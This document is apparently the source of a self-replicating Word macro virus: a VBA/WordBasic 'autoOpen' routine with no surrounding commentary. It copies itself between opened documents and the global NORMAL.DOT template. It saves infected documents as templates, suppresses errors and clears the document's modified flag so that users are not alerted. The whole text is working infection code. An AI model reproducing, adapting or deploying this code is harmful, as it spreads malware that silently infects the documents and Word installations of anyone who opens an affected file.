   Attribute VB_Name = "autoOpen"

   Public Sub MAIN()
   a$ = "autoOpen"
   b$ = ":" + a$
   gl$ = "Global"
   c$ = gl$ + ":" + a$
   d$ = "NORMAL" + "." + "DOT"
   Dim TheSmallOne$
   Dim TheBigOne$
   Dim ThisOne$
   Dim SmallFileAtt
       On Error GoTo -1: On Error GoTo jane

       TheSmallOne$ = WordBasic.[FileName$]() + b$

       TheBigOne$ = c$
       ThisOne$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

       If ThisOne$ = d$ Then
           SmallFileAtt = GetAttr(WordBasic.[FileName$]())
           If SmallFileAtt >= 32 Then SmallFileAtt = SmallFileAtt - 32
           If SmallFileAtt >= 4 Then SmallFileAtt = SmallFileAtt - 4
           If SmallFileAtt >= 2 Then SmallFileAtt = SmallFileAtt - 2
           If SmallFileAtt = 0 Then

               WordBasic.MacroCopy TheBigOne$, TheSmallOne$
               WordBasic.FileSaveAs Format:=1
               WordBasic.SetDocumentDirty 0
           End If
       Else
           WordBasic.MacroCopy TheSmallOne$, TheBigOne$
       End If

   GoTo oughta_here

   jane:

   oughta_here:
       On Error GoTo -1: On Error GoTo 0


   End Sub
